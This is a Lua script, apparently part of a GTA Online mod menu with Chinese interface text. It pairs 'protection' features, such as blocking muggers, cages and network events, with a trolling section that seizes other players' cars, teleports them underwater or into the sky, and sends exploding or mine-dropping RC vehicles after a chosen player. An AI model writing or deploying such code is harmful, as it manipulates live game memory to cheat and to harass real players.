function setBlockStatus(on, areaName)
    if on then
        blockInProgress = true
        startBusySpinner('阻挡中')
        return
    end
    HUD.BUSYSPINNER_OFF()
    if notifications then gtoast('已成功阻挡' ..' '.. areaName ..'.') end
    blockInProgress = false
end
function blocksomewhere()
    local dir = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 5.0, 0)
    GRAPHICS._DRAW_SPHERE(dir.x, dir.y, dir.z, 0.3, 52, 144, 233, 0.5)
    if K.is_key_down('VK_B') then
        if blockInProgress then gtoast('一个阻挡已经在运行') return end
        setBlockStatus(true)
        block({dir.x, dir.y, dir.z - 0.6})
        setBlockStatus(false, '区域')
    end
end
function netItAll(entity)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    local playerList = players.list(true, true, true)
    for i = 1, #playerList do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, playerList[i], true)
        end
    end
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    ENTITY._SET_ENTITY_CLEANUP_BY_ENGINE(entity, false)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
end
function loadModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do wait() end
end
function block(cord)
    local hash = 309416120
    loadModel(hash)
    for i = 0, 180, 8 do
        local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, cord[1], cord[2], cord[3], true, true, true)
        ENTITY.SET_ENTITY_HEADING(wall, i)
        netItAll(wall)
        wait(10)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
end
function string.capitalize(str)
    return str:sub(1,1):upper()..str:sub(2):lower()
end
------------------------------------
-----------防护选项-----------------
------------------------------------  
function blockstealer()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()
        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                gtoast("拦截劫匪来自 " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end
function blockstealerother()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()
        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                gtoast("拦截劫匪发送来自 " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end
notificationBits = 0
nearbyNotificationBits = 0
blips = {}
---@param player Player
---@return integer
local function GetPlayerDroneType(player)
    local p_type = memory.script_global(1911933 + (player * 260 + 1) + 93)
    return memory.read_int(p_type)
end
---@param player Player
---@return Object
local function GetPlayerDroneObject(player)
    local p_object = memory.script_global(1911933 + (players.user() * 260 + 1) + 60 + (player + 1))
    return memory.read_int(p_object)
end
---@param heading number
---@return number
local function InvertHeading(heading)
    if heading > 180.0 then
        return heading - 180.0
    end
    return heading + 180.0
end
---@param droneType integer
---@return integer
local function GetDroneBlipSprite(droneType)
    return (droneType == 8 or droneType == 4) and 548 or 627
end
---@param droneType integer
---@return string
local function GetNotificationMsg(droneType, nearby)
    if droneType == 8 or droneType == 4 then
        return nearby and "%s's 的导弹在 ~r~附近~s~" or "%s 正在使用导弹"
    end
    return nearby and "%s's 的无人机在 ~r~附近~s~" or "%s 正在驾驶无人机"
end
---@param index integer
function RemoveBlipIndex(index)
    if HUD.DOES_BLIP_EXIST(blips[index]) then
        util.remove_blip(blips[index]); blips[index] = 0
    end
end
---@param player Player
function AddBlipForPlayerDrone(player)
    if not blips[player] then
        blips[player] = 0
    end
    if is_player_active(player, true, true) and players.user() ~= player and IsPlayerFlyingAnyDrone(player) then
        if ENTITY.DOES_ENTITY_EXIST(GetPlayerDroneObject(player)) then
            local obj = GetPlayerDroneObject(player)
            local pos = ENTITY.GET_ENTITY_COORDS(obj, true)
            local heading = InvertHeading(ENTITY.GET_ENTITY_HEADING(obj))
            if not HUD.DOES_BLIP_EXIST(blips[player]) then
                blips[player] = HUD.ADD_BLIP_FOR_ENTITY(obj)
                local sprite = GetDroneBlipSprite(GetPlayerDroneType(player))
                HUD.SET_BLIP_SPRITE(blips[player], sprite)
                HUD.SHOW_HEIGHT_ON_BLIP(blips[player], false)
                HUD.SET_BLIP_SCALE(blips[player], 0.8)
                HUD.SET_BLIP_NAME_TO_PLAYER_NAME(blips[player], player)
                HUD.SET_BLIP_COLOUR(blips[player], get_player_org_blip_colour(player))
            else
                HUD.SET_BLIP_DISPLAY(blips[player], 2)
                HUD.SET_BLIP_COORDS(blips[player], pos.x, pos.y, pos.z)
                HUD.SET_BLIP_ROTATION(blips[player], math.ceil(heading))
                HUD.SET_BLIP_PRIORITY(blips[player], 9)
            end
            if not BitTest(nearbyNotificationBits, player) and HUD.DOES_BLIP_EXIST(blips[player]) then
                local msg = GetNotificationMsg(GetPlayerDroneType(player), true)
                notification:normal(msg, HudColour.blue, get_condensed_player_name(player))
                nearbyNotificationBits = SetBit(nearbyNotificationBits, player)
            end
        else
            RemoveBlipIndex(player)
            nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
        end
        if not BitTest(notificationBits, player) then
            local msg = GetNotificationMsg(GetPlayerDroneType(player), false)
            notification123:normal(msg, HudColour.blue, get_condensed_player_name(player))
            notificationBits = SetBit(notificationBits, player)
        end
    else
        RemoveBlipIndex(player)
        notificationBits = ClearBit(notificationBits, player)
        nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
    end
end
--无人机
function IsPlayerFlyingAnyDrone(player)
    return BitTest(memory.read_int(memory.script_global(1853910 + (player * 862 + 1) + 267 + 365)), 26) -- Global_1853910[PLAYER::PLAYER_ID() /*862*/].f_267.f_365, 26
end
local notified_mugger = false
function show_mugger()
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() and NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        util.spoof_script("am_gang_call", function()
            local netId	= memory.read_int(memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1)))
            if NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(netId) and
            not ENTITY.IS_ENTITY_DEAD(NETWORK.NET_TO_PED(netId), false) then
                local mugger = NETWORK.NET_TO_PED(netId)
                draw_bounding_box(mugger, true, {r = 255, g = 0, b = 0, a = 80})
            end
            local p_sender = memory.script_local("am_gang_call", 287)
            if not notified_mugger and p_sender ~= 0 and memory.read_int(p_sender) ~= players.user() and
            is_player_active(memory.read_int(p_sender), false, false) then
                local sender = memory.read_int(p_sender)
                notification123:normal("%s 给你发送了一个劫匪", HudColour.blue, get_condensed_player_name(sender))
                notified_mugger = true
            end
        end)
    elseif notified_mugger then
        notified_mugger = false
    end
end
function removeanything()
    local cleanse_entitycount = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) then
            entities.delete_by_handle(ped)
            cleanse_entitycount += 1
        end
    end
    gtoast("已清除" .. cleanse_entitycount .. "个NPC")
    cleanse_entitycount = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        entities.delete_by_handle(veh)
        cleanse_entitycount += 1
        wait()
    end
    gtoast("已清除".. cleanse_entitycount .."个载具")
    cleanse_entitycount = 0
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        entities.delete_by_handle(object)
        cleanse_entitycount += 1
    end
    gtoast("已清除" .. cleanse_entitycount .. "物体")
    cleanse_entitycount = 0
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        entities.delete_by_handle(pickup)
        cleanse_entitycount += 1
    end
    gtoast("已清除" .. cleanse_entitycount .. "可拾取物体")
    local temp = memory.alloc(4)
    for i = 0, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
    end
    gtoast("已清除所有绳索")
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 400, 0)
    gtoast("已清除所有投掷物")
end
function silentclear()
    local cleanse_entitycount = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) then
            entities.delete_by_handle(ped)
            cleanse_entitycount += 1
        end
    end
    --gtoast("已清除" .. cleanse_entitycount .. "个NPC")
    cleanse_entitycount = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        entities.delete_by_handle(veh)
        cleanse_entitycount += 1
        wait()
    end
    --gtoast("已清除".. cleanse_entitycount .."个载具")
    cleanse_entitycount = 0
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        entities.delete_by_handle(object)
        cleanse_entitycount += 1
    end
    --gtoast("已清除" .. cleanse_entitycount .. "物体")
    cleanse_entitycount = 0
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        entities.delete_by_handle(pickup)
        cleanse_entitycount += 1
    end
    --gtoast("已清除" .. cleanse_entitycount .. "可拾取物体")
    local temp = memory.alloc(4)
    for i = 0, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
    end
    --gtoast("已清除所有绳索")
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 400, 0)
    --gtoast("已清除所有投掷物")
end
function clearall(index, name)
    gtoast("正在清除"..name:lower().."...")
    local counter = 0
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    if index == 1 then
            for _, ped in ipairs(entities.get_all_peds_as_handles()) do
                if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) and (not NETWORK.NETWORK_IS_ACTIVITY_SESSION() or NETWORK.NETWORK_IS_ACTIVITY_SESSION() and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(ped)) then
                    entities.delete_by_handle(ped)
                    counter += 1
                    wait()
                end
            end
        elseif index == 2 then
            for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
                if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) and DECORATOR.DECOR_GET_INT(vehicle, "Player_Vehicle") == 0 and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                    entities.delete_by_handle(vehicle)
                    counter += 1
                end
                wait(25)
            end
        elseif index == 3 then
            for _, object in ipairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(object)
                counter += 1
                wait()
            end
        elseif index == 4 then
            for _, pickup in ipairs(entities.get_all_pickups_as_handles()) do
                entities.delete_by_handle(pickup)
                counter += 1
                wait()
            end
        elseif index == 5 then
            local temp = memory.alloc(4)
            for i = 0, 101 do
                memory.write_int(temp, i)
                if PHYSICS.DOES_ROPE_EXIST(temp) then
                    PHYSICS.DELETE_ROPE(temp)
                    counter += 1
                end
                wait()
            end
        elseif index == 6 then
            local coords = players.get_position(players.user())
            MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 1000, 0)
            counter = "所有"
        elseif index == 4 then
            for i = 0, 99 do
                AUDIO.STOP_SOUND(i)
                wait()
            end
    end
    gtoast("已清除"..tostring(counter).."个"..name:lower()..".")
end
--实体池限制
function entity_limit()
local ped_count = 0
for _, ped in pairs(entities.get_all_peds_as_handles()) do
    if ped ~= players.user_ped() then
        ped_count += 1
    end
    if ped_count >= ped_limit then
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            entities.delete_by_handle(ped)
        end
        notification("Ped池达到上限,正在清理...")
    end
end
local veh__count = 0
for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
    veh__count += 1
    if veh__count >= veh_limit then
        for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
            entities.delete_by_handle(veh)
        end
        notification("载具池达到上限,正在清理...")
    end
end
local obj_count = 0
for _, obj in pairs(entities.get_all_objects_as_handles()) do
    obj_count += 1
    if obj_count >= obj_limit then
        for _, obj in pairs(entities.get_all_objects_as_handles()) do
            entities.delete_by_handle(obj)
        end
        notification("物体池达到上限,正在清理...")
    end
end
end
function blockcrasheffect()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end
function blockfireeffect()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    FIRE.STOP_FIRE_IN_RANGE(coords.x, coords.y, coords.z, 100)
    FIRE.STOP_ENTITY_FIRE(players.user_ped())
end
function antianimal()
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            wait()
        until host ~= -1
        gtoast(players.get_name(host).." 检测到战局《猎杀野兽》事件,正在阻止.")
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
    end
end
local cageModels <const> =
{
    "prop_gold_cont_01",
    "prop_gold_cont_01b",
    "prop_feeder1_cr",
    "prop_rub_cage01a",
    "stt_prop_stunt_tube_s",
    "stt_prop_stunt_tube_end",
    "prop_jetski_ramp_01",
    "stt_prop_stunt_tube_xs",
    "prop_fnclink_03e",
    "prop_container_05a",
    "prop_jetski_ramp_01",
    "prop_cs_dumpster_01a",
    "p_v_43_safe_s",
    "bkr_prop_moneypack_03a",
    "prop_elecbox_12"
}
local lastMsg = ""
local lastNotification <const> = newTimer()
local format = "笼子物体来自 %s"
function anticage()
	local myPos = players.get_position(players.user())
	for _, model in ipairs(cageModels) do
		local modelHash <const> =  util.joaat(model)
		local obj = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(myPos.x,myPos.y,myPos.z, 8.0, modelHash, false, false, false)
		if obj == 0 or not ENTITY.DOES_ENTITY_EXIST(obj) or
		not ENTITY.IS_ENTITY_AT_ENTITY(players.user_ped(), obj, 5.0, 5.0, 5.0, false, true, 0) then
			continue
		end
		local ownerId = get_entity_owner(obj)
		local msg = string.format(format, get_condensed_player_name(ownerId))
		if ownerId ~= players.user() and is_player_active(ownerId, false, false) and
		(lastMsg ~= msg or lastNotification.elapsed() >= 15000) then
			notification(msg, HudColour.blueLight)
			lastMsg = msg
			lastNotification.reset()
		end
		request_control(obj, 1500)
		entities.delete_by_handle(obj)
	end
end
function blocknetwork(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockNetEvents)
        notification("已阻止所有网络传输", colors.blue)
    else
        menu.trigger_command(UnblockNetEvents)
        notification("关闭阻止网络传输", colors.red)
    end
end
function blockincoming(on_toggle)
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockIncSyncs)
        notification("开启阻止网络事件传入", colors.blue)
    else
        menu.trigger_command(UnblockIncSyncs)
        notification("关闭阻止网络事件传入", colors.red)
    end
end
function blockout(on_toggle)
    if on_toggle then
        notification("开启阻止网络事件传出", colors.blue)
        menu.trigger_commands("desyncall on")
    else
        notification("关闭阻止网络事件传出", colors.red)
        menu.trigger_commands("desyncall off")
    end
end
function chickenmode(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end
------------------------------------
-----------载具恶搞-----------------
------------------------------------  
--log
local function get_ground_z(coords)
    local start_time = os.time()
    while true do
        if os.time() - start_time >= 5 then
            log("未能在5秒内到达地面Z轴高度")
            return nil
        end
        local success, est = util.get_ground_z(coords['x'], coords['y'], coords['z']+2000)
        if success then
            log("成功获得地面 ： " .. est)
            return est
        end
        wait()
    end
end
function get_waypoint_coords()
    return HUD.GET_BLIP_INFO_ID_COORD(HUD.GET_FIRST_BLIP_INFO_ID(HUD.GET_WAYPOINT_BLIP_ENUM_ID()))
end
function set_player_into_suitable_seat(ent)
    local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
    if not PED.IS_PED_A_PLAYER(driver) or driver == 0 then
        if driver ~= 0 then
            entities.delete_by_handle(driver)
        end
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
    else
        for i=0, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(ent) do
            if VEHICLE.IS_VEHICLE_SEAT_FREE(ent, i) then
                PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
            end
        end
    end
end
function request_control_of_entity(ent)
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and util.is_session_started() then
        log("Requesting entity control of " .. ent)
        local netid = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(ent)
        NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netid, true)
        local st_time = os.time()
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) do
            if os.time() - st_time >= 5 then
                util.log("未能在5秒内请求实体控制(实体 " .. ent .. ")")
                break
            end
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            wait()
        end
    end
end
local function tp_player_car_to_coords(pid, coord)
    local name = PLAYER.GET_PLAYER_NAME(pid)
    if robustmode then
        menu.trigger_commands("spectate" .. name .. " on")
        wait(1000)
    end
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity(car)
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(car) then
            for i=1, 3 do
                gtoast("成功")
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(car, coord['x'], coord['y'], coord['z'], false, false, false)
            end
        end
    end
end
function tp_all_player_cars_to_coords(coord)
    for k,pid in pairs(players.list(false, true, true)) do
        tp_player_car_to_coords(pid, coord)
    end
end
function tpcartome(pid)
    tp_player_car_to_coords(pid, ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true))
end
function tocartopoint(pid)
    local c = get_waypoint_coords()
    if c ~= nil then
        tp_player_car_to_coords(pid, c)
    end
end
function tptomaze(pid)
    local c = {}
    c.x = -75.261375
    c.y = -818.674
    c.z = 326.17517
    tp_player_car_to_coords(pid, c)
end
function tptounderwater(pid)
    local c = {}
    c.x = 4497.2207
    c.y = 8028.3086
    c.z = -32.635174
    tp_player_car_to_coords(pid, c)
end
function tptohighair(pid)
    local c = {}
    c.x = -75
    c.y = -818
    c.z = 2400
    tp_player_car_to_coords(pid, c)
end
function tolsc(pid)
    local c = {}
    c.x = -353.84512
    c.y = -135.59108
    c.z = 39.009624
    tp_player_car_to_coords(pid, c)
end
function tpscp(pid)
    local c = {}
    c.x = 1642.8401
    c.y = 2570.7695
    c.z = 45.564854
    tp_player_car_to_coords(pid, c)
end
function tocell(pid)
    local c = {}
    c.x = 1737.1896
    c.y = 2634.897
    c.z = 45.56497
    tp_player_car_to_coords(pid, c)
end
local function create_trolly_vehicle(targetId, vehicleHash, pedHash)
    request_model(vehicleHash); request_model(pedHash)
    local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(targetId)
    local pos = ENTITY.GET_ENTITY_COORDS(targetPed, false)
    local driver = 0
    local vehicle = entities.create_vehicle(vehicleHash, pos, 0.0)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(vehicle), true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(vehicle, false, true)
    NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(vehicle), players.user(), true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(vehicle, true, 1)
    set_decor_flag(vehicle, DecorFlag_isTrollyVehicle)
    VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
    for i = 0, 50 do
        VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
    end
    local offset = get_random_offset_from_entity(vehicle, 25.0, 25.0)
    local outCoords = v3.new()
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE(offset.x, offset.y, offset.z, outCoords, 1, 3.0, 0.0) then
        driver = entities.create_ped(5, pedHash, pos, 0.0)
        NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.PED_TO_NET(driver), true)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(driver, true, true)
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.PED_TO_NET(driver), players.user(), true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(driver, true, 1)
        PED.SET_PED_INTO_VEHICLE(driver, vehicle, -1)
        ENTITY.SET_ENTITY_COORDS(vehicle, outCoords.x, outCoords.y, outCoords.z, false, false, false, true)
        set_entity_face_entity(vehicle, targetPed, false)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
        VEHICLE.SET_VEHICLE_IS_CONSIDERED_BY_PLAYER(vehicle, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 1, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(driver, 3, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, targetPed, 6, 500.0, 786988, 0.0, 0.0, true)
        PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(driver, 1)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
    end
    return vehicle, driver
end
local setInvincible = false
local count = 1
local AttackType <const> = {explode = 0, dropMine = 1}
local attacktype = 0
local selectedMine = 1
local mineSlider
function send_veh_attack(opt, index, pid)
    local pedHash <const> = util.joaat("mp_m_freemode_01")
		local i = 0
		repeat
			if opt == "Bandito" then
				local vehicleHash <const> = util.joaat("rcbandito")
				local pedHash <const> = util.joaat("mp_m_freemode_01")
				local vehicle, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
				add_blip_for_entity(vehicle, 646, 4)
				ENTITY.SET_ENTITY_INVINCIBLE(vehicle, setInvincible)
				ENTITY.SET_ENTITY_VISIBLE(driver, false, false)
			elseif opt == "Go-Kart" then
				local vehicleHash <const> = util.joaat("veto2")
				local gokart, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
				ENTITY.SET_ENTITY_INVINCIBLE(gokart, setInvincible)
				VEHICLE.SET_VEHICLE_COLOURS(gokart, 89, 0)
				VEHICLE.TOGGLE_VEHICLE_MOD(gokart, 18, true)
				ENTITY.SET_ENTITY_INVINCIBLE(driver, setInvincible)
				PED.SET_PED_COMPONENT_VARIATION(driver, 3, 111, 13, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 4, 67, 5, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 6, 101, 1, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 8, -1, -1, 2)
				PED.SET_PED_COMPONENT_VARIATION(driver, 11, 148, 5, 2)
				PED.SET_PED_PROP_INDEX(driver, 0, 91, 0, true)
				add_blip_for_entity(gokart, 748, 5)
			end
			i = i + 1
			wait(150)
		until i == count
    end
function send_veh_attack_god(toggle)
    setInvincible = toggle 
end
local GetMineHash = function()
    if selectedMine == 1 then
        return util.joaat("vehicle_weapon_mine_kinetic_rc")
    elseif selectedMine == 2 then
        return util.joaat("vehicle_weapon_mine_emp_rc")
    end
end
function send_veh_attacker(pid)
    local vehicleHash <const> = util.joaat("rcbandito")
    local pedHash <const> = util.joaat("mp_m_freemode_01")
    local lastShoot = newTimer()
    local bandito, driver = create_trolly_vehicle(pid, vehicleHash, pedHash)
    VEHICLE.SET_VEHICLE_MOD(bandito, 5, 3, false)
    VEHICLE.SET_VEHICLE_MOD(bandito, 48, 5, false)
    VEHICLE.SET_VEHICLE_MOD(bandito, 9, 0, false)
    VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(bandito, 128, 0, 128)
    VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(bandito, 128, 0, 128)
    ENTITY.SET_ENTITY_VISIBLE(driver, false, false)
    local blip = add_blip_for_entity(bandito, 646, 27)
    util.create_tick_handler(function()
        if not ENTITY.DOES_ENTITY_EXIST(bandito) or ENTITY.IS_ENTITY_DEAD(bandito, false) or
        not ENTITY.DOES_ENTITY_EXIST(driver) or ENTITY.IS_ENTITY_DEAD(driver, false) then
            set_entity_as_no_longer_needed(bandito)
            set_entity_as_no_longer_needed(driver)
            return false
        elseif is_player_active(pid, false, true) then
            local playerPos = players.get_position(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(bandito, true)
            if playerPos:distance(pos) > 3.0 or not request_control_once(bandito) or
            not request_control_once(driver) then
                return
            end
            if attacktype == AttackType.explode then
                NETWORK.NETWORK_EXPLODE_VEHICLE(bandito, true, false, NETWORK.PARTICIPANT_ID_TO_INT())
                ENTITY.SET_ENTITY_HEALTH(driver, 0, 0)
            elseif attacktype == AttackType.dropMine and
            (not lastShoot.isEnabled() or lastShoot.elapsed() > 1000) and not
            MISC.IS_PROJECTILE_TYPE_WITHIN_DISTANCE(pos.x, pos.y, pos.z, GetMineHash(), 3.0, true) then
                local weapon <const> = GetMineHash()
                if not WEAPON.HAS_WEAPON_ASSET_LOADED(weapon) then
                    WEAPON.REQUEST_WEAPON_ASSET(weapon, 31, 26)
                    return
                end
                local min, max = v3.new(), v3.new()
                local modelHash = ENTITY.GET_ENTITY_MODEL(bandito)
                MISC.GET_MODEL_DIMENSIONS(modelHash, min, max)
                local coord0 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(bandito, 0.0, min.y, 0.2)
                local coord1 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(bandito, 0.0, min.y, min.z)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(
                    coord0.x, coord0.y, coord0.z, coord1.x, coord1.y, coord1.z, 0, true, weapon, players.user(), true, false, -1.0, 0, false, false, 0, true, 1, 0, 0)
                lastShoot.reset()
            end
        elseif request_control(bandito) and request_control(driver) then
            TASK.CLEAR_PED_TASKS(driver)
            TASK.TASK_VEHICLE_DRIVE_WANDER(driver, bandito, 10.0, 786603)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
            remove_decor(bandito)
            util.remove_blip(blip)
            set_entity_as_no_longer_needed(bandito)
            set_entity_as_no_longer_needed(driver)
            return false
        end
    end)
end
function send_veh_attacker_weapon(index, value)
    if index == 1 then
        attacktype = AttackType.explode
        menu.set_visible(mineSlider, false)
    elseif index == 2 then
        attacktype = AttackType.dropMine
        menu.set_visible(mineSlider, true)
    end
end
